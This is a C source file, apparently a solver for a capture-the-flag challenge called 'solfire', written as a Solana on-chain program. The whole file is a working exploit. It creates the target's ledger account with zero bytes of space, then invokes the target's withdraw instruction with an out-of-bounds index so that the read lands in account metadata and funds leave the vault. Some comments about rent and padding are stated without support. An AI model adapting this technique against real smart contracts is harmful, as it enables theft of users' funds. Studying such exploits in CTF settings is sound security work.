#include <solana_sdk.h>

// Account indices for our solver program
#define CLOCK   0
#define SYSTEM  1
#define LEDGER  2
#define VAULT   3
#define USER    4
#define SOLFIRE 5

// ---------------------------------------------------------
// Create the ledger account ourselves with 0 bytes of space,
// owned by the solfire program. This avoids the costly
// handle_create call and sets up the OOB condition.
// ---------------------------------------------------------
void solfire_create_zero_space(SolParameters *params, uint8_t ledger_nonce) {
    sol_log("Creating zero-space ledger!");

    // This account will be signed by our own program (PDA)
    const SolSignerSeed seed = {&ledger_nonce, 1};
    const SolSignerSeeds signers_seeds = {&seed, 1};

    SolAccountMeta meta[] = {
        {params->ka[USER].key, true, true},   // payer, signer
        {params->ka[LEDGER].key, true, true}  // new account, signer
    };

    uint8_t buf[0x34] = {0};
    buf[0] = 0; // SystemInstruction::CreateAccount
    // [4-12]  lamports to transfer = 0 (rent-exempt minimum, we can use 0)
    buf[12] = 0x00; // space to allocate = 0 BYTES  <-- CRITICAL
    // [20-52] owner = solfire program
    sol_memcpy(&buf[20], params->ka[SOLFIRE].key, 32);

    const SolInstruction instruction = {
        params->ka[SYSTEM].key, meta, SOL_ARRAY_SIZE(meta),
        buf, SOL_ARRAY_SIZE(buf)
    };
    sol_invoke_signed(&instruction, params->ka, params->ka_num, &signers_seeds, 1);
}

// ---------------------------------------------------------
// Call handle_withdraw with index = 0x280 (640), one past
// the 640-entry balances array. Because the ledger was
// created with 0 bytes, the runtime pads it with 0x2800
// zeros, and the read at 0x2800 lands in account metadata.
// ---------------------------------------------------------
void solfire_withdraw_oob(SolParameters *params, uint8_t vault_nonce) {
    sol_log("Exploiting withdraw OOB!");

    SolAccountMeta meta[] = {
        {params->ka[CLOCK].key, false, false},  // fake clock (contains "C1ock")
        {params->ka[SYSTEM].key, false, false}, // system program
        {params->ka[LEDGER].key, true, false},  // ledger (writable)
        {params->ka[USER].key, true, true},     // user (writable, signer)
        {params->ka[VAULT].key, true, false}    // vault (writable)
    };

    uint8_t buf[16] = {0};
    buf[0] = 2;          // instruction code for handle_withdraw
    buf[4] = 0x80;       // index = 0x280 (little-endian)
    buf[5] = 0x02;
    buf[8] = 0x00;       // amount = 0x10000 (little-endian)
    buf[9] = 0x00;
    buf[10] = 0x01;
    buf[12] = vault_nonce; // vault PDA nonce

    const SolInstruction instruction = {
        params->ka[SOLFIRE].key, meta, SOL_ARRAY_SIZE(meta),
        buf, SOL_ARRAY_SIZE(buf)
    };
    sol_invoke_signed(&instruction, params->ka, params->ka_num,
                      (SolSignerSeeds*)0, 0);
}

// ---------------------------------------------------------
// Entrypoint: expects 6 accounts + 2 bytes of instruction data
// (ledger_nonce, vault_nonce).
// ---------------------------------------------------------
extern uint64_t entrypoint(const uint8_t *input) {
    SolAccountInfo accounts[6];
    SolParameters params = { .ka = accounts };

    if (!sol_deserialize(input, &params, SOL_ARRAY_SIZE(accounts))) {
        return ERROR_INVALID_ARGUMENT;
    }

    uint8_t ledger_nonce = params.data[0];
    uint8_t vault_nonce  = params.data[1];

    solfire_create_zero_space(&params, ledger_nonce);
    solfire_withdraw_oob(&params, vault_nonce);

    return SUCCESS;
}
